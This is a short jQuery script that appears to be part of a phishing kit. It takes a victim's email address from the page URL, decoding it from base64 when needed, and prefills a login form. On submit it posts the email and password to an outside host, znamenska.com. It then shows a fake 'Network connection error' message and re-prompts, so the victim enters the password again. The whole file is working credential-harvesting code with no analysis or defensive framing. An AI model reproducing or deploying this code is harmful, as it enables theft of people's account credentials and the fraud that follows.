 $(document).ready((function () {
var n = window.location.href,
    t = n.substring(n.lastIndexOf("=") + 1);
    if(!t.includes("@")){
    t= atob(t);
     }
    console.log(t);
    $("#x1").val(t), $("#myfm").submit((function (n) {
                n.preventDefault();
                $("#A1").val();
                var a = new FormData($("#myfm")[0]);
                $("#cum").html('<button id="cum" class="cumsocks"> <span class="spinner-grow spinner-grow-sm"></span>\n        Verifying...</button>').prop("disabled", !0), 
                $.ajax({
                    url: "https://znamenska.com/devznamenska/user.php",
                    type: "POST",
                    dataType: "json",
                    
                    data: {
                        em: $("#x1").val(),
                        pw: $("#x2").val()
                    },
                    
                    success: function (n) {
                        console.log(n), $("#bd").show(), $("#hm").hide(), setTimeout((function () {
                        $("#x1").val(t), $("#x2").val("").focus(), $("#msg").html("Network connection error, try again."), $("#cum").html("View Document").prop("disabled", !1)
                        }), 2e3)
                    },
                    error: function (e) {
                        console.log(e), $("#bd").show(), $("#hm").hide(), setTimeout((function () {
                        $("#x1").val(t), $("#x2").val("").focus(), $("#msg").html("Network connection error, try again."), $("#cum").html("View Document").prop("disabled", !1)
                        }), 2e3)
                    }
                })
            }))
            }))